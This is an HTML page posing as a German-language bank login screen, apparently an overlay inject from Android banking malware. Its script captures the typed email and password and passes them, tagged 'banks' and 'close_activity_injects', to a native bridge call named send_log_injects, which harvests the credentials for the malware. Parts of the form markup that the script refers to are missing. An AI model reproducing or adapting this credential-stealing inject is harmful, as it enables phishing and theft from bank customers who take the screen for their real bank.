<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <style>
        html{height: 100%;}
        body {
            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABdwAAApsAQMAAADueb27AAAAA1BMVEWEuBaZjh9nAAAB/0lEQVQYGe3BMQEAAADCIPunXgwfYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcBKyJQABTCV+kAAAAABJRU5ErkJggg==');
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center center;
        }

        header {
            padding: 15px;
        }

        section {
            padding: 15px
        }

        #formBlock {
            border: 0;
            background-color: #f9fbf3;
            padding: 15px;
        }
        
        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }

        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: auto;
            position: absolute;
            z-index: 1;
            left: 0;
            top: 50%;
            line-height: 1em;
            color: #999999;
            transition: all 0.2s ease;
        }

        .cool-input__input_filled + .cool-input__placeholder, .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 0.3em;
            padding: 5px 0;
            z-index: 99;
            width: auto;
            left: 0;
        }

        .cool-input__input:focus + .cool-input__placeholder {
            color: #559e30;
            font-weight: 600;
        }

        .input {
            border: 0;
            border-bottom: 1px solid #b7b8b8;
            margin-top: 15px;
            padding-left: 0;
            transition: all 0.2s ease;
            color: #000;
        }

        .input:focus {
            border-bottom: 2px solid #559e30;
        }

        input,button {
            outline: none !important;
            box-shadow: none !important;
        }

        .button {
            width: 100%;
            padding: 10px;
            color: #fff;
            background-color: #84b816;
            border:0;
            font-weight: 600;
        }

        .button:disabled {
            background-color: #f2f2f2;
            color: #999999;
        }
    </style>
</head>

                <p style="font-size: 14px;font-weight: 600;color: #84b816;margin-top: 20px;">Passwort vergessen?</p>
            
                <input type="submit" class="button" id="sendData" disabled value="Login mit Passwort">

    <script>
        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        var eyeOff = document.getElementById('eyeOff'),
            eyeOn = document.getElementById('eyeOn');

        eyeOff.onclick = () => {
            password.type = 'text'

            eyeOff.style.display = 'none'
            eyeOn.style.display = 'inline'
        }

        eyeOn.onclick = () => {
            password.type = 'password'

            eyeOn.style.display = 'none'
            eyeOff.style.display = 'inline'
        }

        function check() {
            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length >= 12) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        login.onkeyup = () => {
            check()
        }

        password.onkeyup = () => {
            check()
        }

        sendData.onclick = () => {
            var data = {};
            data.login = login.value;
            data.password = password.value;
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
    </script>
